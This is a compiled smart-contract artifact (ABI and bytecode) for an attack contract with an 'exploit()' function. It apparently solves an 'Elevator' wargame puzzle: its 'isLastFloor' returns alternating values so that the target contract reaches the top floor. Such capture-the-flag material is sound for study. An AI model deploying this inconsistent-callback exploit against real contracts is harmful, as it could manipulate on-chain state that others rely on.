{"abi":[{"type":"constructor","inputs":[{"name":"_elevatorAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"isLastFloor","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60806040525f805460ff19166001179055348015601a575f5ffd5b506040516101e63803806101e68339810160408190526037916060565b5f80546001600160a01b0390921661010002610100600160a81b0319909216919091179055608b565b5f60208284031215606f575f5ffd5b81516001600160a01b03811681146084575f5ffd5b9392505050565b61014e806100985f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80635f9a4bca1461003857806363d9b77014610073575b5f5ffd5b61005f610046366004610101565b505f805460ff19811660ff918216159081179092551690565b604051901515815260200160405180910390f35b61007b61007d565b005b5f546040517fed9a71340000000000000000000000000000000000000000000000000000000081526001600482015261010090910473ffffffffffffffffffffffffffffffffffffffff169063ed9a7134906024015f604051808303815f87803b1580156100e9575f5ffd5b505af11580156100fb573d5f5f3e3d5ffd5b50505050565b5f60208284031215610111575f5ffd5b503591905056fea2646970667358221220e315a40baabb30edb5a033ea51eeccb7f28b128f2c85ea9fb33ac60b209009b464736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","isLastFloor(uint256)":"5f9a4bca"},"id":0}